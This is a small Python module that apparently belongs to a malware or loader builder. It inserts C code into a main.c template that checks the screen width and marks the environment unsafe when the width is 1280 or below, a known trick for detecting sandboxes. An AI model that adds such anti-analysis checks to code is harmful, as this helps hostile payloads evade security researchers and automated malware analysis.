def desc():
    return "Check screen resolution size to detect sanboxes"

def run():
    libs = '''\
// Common screen resolutions
// - 1920x1080 (Full HD)
// - 2560x1440 (Quad HD)
// - 3840x2160 (4K UHD)
// - 1280x720 (HD)
#define MIN_WIDTH 1280
'''

    functions = '''\
//Check for Screen Width
int checkScreenWidth() {
    return (GetSystemMetrics(SM_CXFULLSCREEN) <= MIN_WIDTH);
}
'''

    keying = '''\
	if (checkScreenWidth())
		SafeEnv = FALSE;\
'''

    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{LIBS}}", libs + "\n{{LIBS}}") \
                              .replace("{{FUNCTIONS}}", functions + "\n{{FUNCTIONS}}") \
                              .replace("{{KEYING}}", keying + "\n{{KEYING}}")

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)

    return